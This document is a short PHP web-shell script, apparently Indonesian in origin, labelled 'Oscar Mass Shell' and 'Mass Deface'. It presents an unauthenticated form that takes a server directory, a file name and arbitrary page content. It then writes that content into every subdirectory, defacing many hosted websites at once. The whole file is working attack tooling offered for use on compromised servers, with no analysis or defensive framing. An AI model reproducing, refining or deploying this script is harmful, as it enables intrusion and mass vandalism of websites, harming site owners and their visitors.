<?php

/*

Oscar Mass Shell

*/
echo "<title>Oscar - Mass Deface </title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'></center>";
echo "<center>Direktori Situs: <input type='text' name='base_dir' size='50' value='".getcwd ()."'></center><br><br>";
echo "<center>NAMA FILE : <input type='text' name='file_name' value='info.txt'></center><br><br>";
echo "<center>INDEX : <br><textarea style='width: 685px; height: 330px;' name='index'>Tempel kode indeks Anda di sini.</textarea></center><br>";
echo "<center><input type='submit' value='Start'></form></center>";

if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." TIDAK DITEMUKAN !<br>");

        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." BUKAN INDEKS !<br>");

        @chdir ($_POST['base_dir']) or die ("MASS GAGAL");

        $files = @scandir ($_POST['base_dir']) or die ("MANTAP<br>");

        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>MANTAP!</span><br>";
                }
        endforeach;
}

?>